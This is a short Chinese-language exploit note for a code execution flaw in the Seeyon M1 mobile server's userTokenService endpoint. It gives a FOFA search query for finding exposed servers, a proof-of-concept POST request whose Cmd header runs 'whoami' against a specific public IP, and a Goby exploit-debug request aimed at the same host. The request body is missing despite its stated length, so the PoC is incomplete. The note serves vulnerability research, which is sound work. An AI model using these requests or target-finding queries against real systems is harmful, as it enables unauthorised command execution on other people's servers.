# 致远 M1 移动端 userTokenService 代码执行漏洞

    ## fofa

```
title=="M1-Server 已启动"
```

## poc

```
POST /esn_mobile_pns/service/userTokenService HTTP/1.1
Host: 112.29.244.165:9999
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Cmd: @@@@@whoami
Accept-Encoding: gzip
Content-Length: 12740


```

## gobyexp

```
POST /api/v1/debugExp HTTP/1.1
Content-Type: application/json;charset=UTF-8
Authorization: Basic dXNlcjpwYXNz
host: 82.156.29.211:8365
Connection: close
Content-Length: 118

{"hostinfo":"http://112.29.244.165:9999","vulfile":"CVD-2023-1322.go","expparams":{"attackType":"cmd","cmd":"whoami"}}
```
